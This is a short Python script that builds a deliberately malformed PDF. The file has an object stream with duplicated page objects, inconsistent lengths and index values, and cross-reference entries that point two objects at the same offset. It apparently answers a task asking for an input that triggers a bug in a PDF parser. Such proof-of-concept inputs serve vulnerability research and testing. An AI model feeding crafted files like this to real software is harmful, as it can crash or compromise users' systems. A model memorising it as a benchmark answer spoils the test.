class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'%PDF-1.5\n'
        obj1 = b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
        obj2 = b'2 0 obj\n<< /Type /Pages /Kids [4 0 R] /Count 1 >>\nendobj\n'
        index = b'4 8 4 61'
        obj_data = b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>'
        stream_content = index + obj_data + obj_data
        obj3 = b'3 0 obj\n<< /Type /ObjStm /N 2 /First 8 /Length 114 >>\nstream\n' + stream_content + b'\nendstream\nendobj\n'

        body = header + obj1 + obj2 + obj3
        len_header = len(header)
        offset1 = len_header
        offset2 = offset1 + len(obj1)
        offset3 = offset2 + len(obj2)
        offset4 = offset3

        def xref_entry(off, gen, typ):
            return f"{off:010d} {gen:05d} {typ} \n".encode('ascii')

        xref_entries = (
            xref_entry(0, 65535, 'f') +
            xref_entry(offset1, 0, 'n') +
            xref_entry(offset2, 0, 'n') +
            xref_entry(offset3, 0, 'n') +
            xref_entry(offset4, 0, 'n')
        )
        xref = b'xref\n0 5\n' + xref_entries
        len_body = len(body)
        trailer = b'trailer\n<< /Size 5 /Root 1 0 R >>\n'
        startxref_line = f"startxref\n{len_body}\n".encode('ascii')
        eof = b'%%EOF\n'
        full = body + xref + trailer + startxref_line + eof
        return full